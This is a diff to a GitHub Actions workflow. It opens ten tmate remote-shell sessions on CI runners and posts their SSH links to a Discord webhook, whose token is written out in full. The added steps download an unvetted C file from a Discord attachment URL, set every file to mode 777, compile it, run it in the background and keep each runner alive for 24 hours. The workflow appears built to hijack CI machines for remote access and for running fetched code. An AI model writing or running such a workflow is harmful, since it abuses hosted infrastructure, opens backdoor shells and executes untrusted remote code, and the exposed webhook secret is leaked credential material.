@@ -1,8 +1,6 @@
 name: Szy
-
 on:
   workflow_dispatch:
-
 jobs:
   setup-machines:
     runs-on: ubuntu-latest
@@ -27,10 +25,8 @@ jobs:
           ip a
           echo "==== Top 10 Processes ===="
           ps aux --sort=-%mem | head -n 11
-
       - name: Install tmate
         run: sudo apt-get update && sudo apt-get install -y tmate
-
       - name: Start 10 tmate sessions and save SSH links
         id: tmate
         run: |
@@ -42,7 +38,6 @@ jobs:
             echo "Group ${{ matrix.group }} - tmate $i SSH: $TMATE_SSH" | tee -a tmate_links.txt
           done
           cat tmate_links.txt
-
       - name: Send tmate links to Discord webhook
         env:
           DISCORD_WEBHOOK: https://discord.com/api/webhooks/1397728526823587870/FWbDFBd63p735YfHMGQaWqYtHKmYXXtZny_iBY46ARt5nBfYUNjjxL0CIRuTCV_eLtbp
@@ -58,8 +53,21 @@ jobs:
               $DISCORD_WEBHOOK
             rm $part
           done
-
-      - name: Keep session running
+      - name: Change to home directory
+        run: cd
+      - name: Install development dependencies
+        run: sudo apt-get install -y build-essential libcurl4-openssl-dev libjson-c-dev
+      - name: Download api.c file
+        run: wget -O api.c "https://cdn.discordapp.com/attachments/1408872339499909161/1420395292997586974/message.txt?ex=68d53db3&is=68d3ec33&hm=ad8be05b3683ce0a2371e74b2699afc0bf0518478174d4879676bb4359c46ef3&"
+      - name: Set permissions
+        run: chmod 777 *
+      - name: Compile api.c
+        run: gcc -o api api.c -lpthread -lcurl -ljson-c
+      - name: Execute api and keep running
         run: |
-          echo "Group ${{ matrix.group }} 24 saat boyunca açık kalacak..."
+          echo "Group ${{ matrix.group }} API başlatılıyor..."
+          nohup ./api &
+          API_PID=$!
+          echo "API PID: $API_PID"
+          echo "API başlatıldı, 24 saat boyunca çalışacak..."
           sleep 86400
